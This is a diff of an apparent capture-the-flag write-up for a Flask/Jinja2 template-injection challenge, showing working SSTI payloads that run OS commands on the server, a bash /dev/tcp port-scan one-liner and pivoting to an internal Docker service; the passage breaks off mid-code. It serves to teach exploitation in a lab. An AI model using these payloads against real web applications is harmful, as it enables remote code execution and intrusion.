@@ -4,20 +4,45 @@
 
 Same as sst3.
 
-https://stackoverflow.com/a/12341532/12864941
-The eviltree.py file is weird it contains html, it can be displayed on the website with:
-```py
-{{request.application.__globals__.__builtins__.__import__('os').popen('cat eviltree.py').read()|safe}}
-```
-It shows some github code from (eviltree)[https://github.com/t3l3machus/eviltree]\
-Not sure if it is part of the challenge.
-
-There is a docker-compose (see docker-compose.yml) that talks about a service that should be down but isn't.\
-Haven't found a way to access it yet.
+The flag doesn't seem to be in any of the server files.
 
 ```dalek.py``` launches the web server and kills children processes every 10 secondes, preventing backdoors.
 
-```py
+There is a ```docker-compose.yml``` file:
+```yml
+version: "3.3"
+
+# FIXME: Don't forget to place this file inside .dockerignore ! we don't want anyone looking at this
+
+services:
+  ssti4:
+    build: "./Challenges/SSTI/ssti4"
+    restart: always
+    networks:
+      ssti4:
+
+  # TODO: This is old don't forget to stop the server in the next version !
+  # toto8042:
+  #   build: "./Challenges/SSTI/ssti4/toto8042"
+  #   restart: always
+  #   port:
+  #     - ":" WARNING: The port was still open, asked Sysadmin to remove it last month....
+  #   networks:
+  #     ssti4:'
+```
+
+It references a toto8042 service that shouldn't be up but still is.
+
+```yml
+#   port:
+  #     - ":"
+```
+This tells us that all ports are forwarded.
+
+ssti4 and toto8042 are on the same network (https://docs.docker.com/compose/networking/#specify-custom-networks).
+
+We can confirm that by pinging toto8042:
+```
 {{request.application.__globals__.__builtins__.__import__('os').popen('ping -c 1 toto8042').read()}}
 PING toto8042 (172.23.0.2): 56 data bytes
 64 bytes from 172.23.0.2: icmp_seq=0 ttl=64 time=0.147 ms
@@ -26,42 +51,58 @@ PING toto8042 (172.23.0.2): 56 data bytes
 round-trip min/avg/max/stddev = 0.147/0.147/0.147/0.000 ms
 ```
 
-How to see stderr of commands (https://stackoverflow.com/a/637834/12864941):
-```py
-{{request.application.__globals__.__builtins__.__import__('os').popen('ls abc 2>&1 | cat').read()}}
+## Solution
+
+### Port discovery
+
+(see port_discovery.js)
+
+nmap (as well as nc, telnet and more) is not available on ssti4 so we can't use it to discover ports.
+
+Fortunately the list of the 1000 most used ports is available [here](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).
+
+We can test if a port is open with this simple bash command ([source](https://stackoverflow.com/a/35338529/12864941)):
+```bash
+timeout 1 bash -c '</dev/tcp/toto8042/${i}' && echo -n open || echo -n closed
 ```
 
-nmap, nc, and telnet are not installed.
+Using this method we find that ports 4242 and 8042 are open.
 
-```
-{{request.application.__globals__.__builtins__.__import__('os').popen('ip a').read()}}
+### Port 8042
 
-1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-       valid_lft forever preferred_lft forever
-1342: eth0@if1343: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
-    link/ether 02:42:ac:15:00:09 brd ff:ff:ff:ff:ff:ff
-    inet 172.21.0.9/16 brd 172.21.255.255 scope global eth0
-       valid_lft forever preferred_lft forever
-1344: eth1@if1345: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
-    link/ether 02:42:ac:17:00:03 brd ff:ff:ff:ff:ff:ff
-    inet 172.23.0.3/16 brd 172.23.255.255 scope global eth1
-       valid_lft forever preferred_lft forever
-```
-
-See port_discovery.js
-port 4242, 8042, and 69778 are open
-
-(Using ssti)
-```
+Running curl on 8042 (using ssti) returns this:
+```bash
 $ curl toto8042:8042
 this is not the way this time, goodluck !!
 ```
 
-used ```python -c "CMD"``` to run python code and get read TCP connection.
+### Port 4242
 
-https://wiki.python.org/moin/TcpCommunication
+(see solve.js)
+
+Port 4242 is not http.
+
+We used python3 to open a TCP socket.
+
+To run python code we can use ```python3 -c "command"```.
+
+The ssti command looks like this:
+```py
+{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\"").read()}}
+```
+Note: quotes get a little tricky, the python command can only single quotes, at least using our implementation.
+
+To see stderr we add ``` 2>&1 | cat``` at the end of the command (redirects stderr to stdout).
+```py
+{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\" 2>&1 | cat").read()}}
+```
+
+We can prevent modifications of the output by jinja by using the "safe" filter ([source](https://stackoverflow.com/a/12341532/12864941)), it is particularly useful when reading python errors.
+```py
+{{request.application.__globals__.__builtins__.__import__("os").popen("python -c \"CMD\" 2>&1 | cat").read()|safe}}
+```
+
+We can then open a socket to ```toto8042:4242``` and read it ([source](https://wiki.python.org/moin/TcpCommunication)):
 ```py
 import socket
 
